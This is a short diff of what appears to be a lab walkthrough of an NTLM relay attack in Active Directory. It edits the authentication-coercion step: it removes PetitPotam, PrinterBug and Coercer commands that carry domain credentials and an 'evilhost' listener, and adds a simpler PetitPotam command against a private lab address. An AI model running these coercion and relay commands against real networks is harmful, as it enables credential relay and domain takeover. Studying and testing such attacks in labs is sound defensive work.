@@ -50,21 +50,7 @@ sudo ntlmrelayx.py -t 192.168.2.3 -smb2support
 
 ## Step 3: Trigger Authentication (Coerce)
 ```bash
-cd ~/PetitPotam
-python3 PetitPotam.py -d luckytom.com -u domainuser01 -p 'User01!@#' \
-  evilhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA@80/a.txt \
-  192.168.214.135
-```
-
-**Alternative coercion methods**:
-```bash
-# Using PrinterBug
-python3 printerbug.py luckytom.com/domainuser01:User01!@#@192.168.214.135 \
-  evilhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
-
-# Using Coercer (multi-protocol)
-python3 Coercer.py -u domainuser01 -p 'User01!@#' -d luckytom.com \
-  -l 192.168.214.129 -t 192.168.214.135
+python PetitPotam.py -d test.com -u test1 -p Test..111 win10pc1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA 192.168.2.3
 ```
 
 # Demo
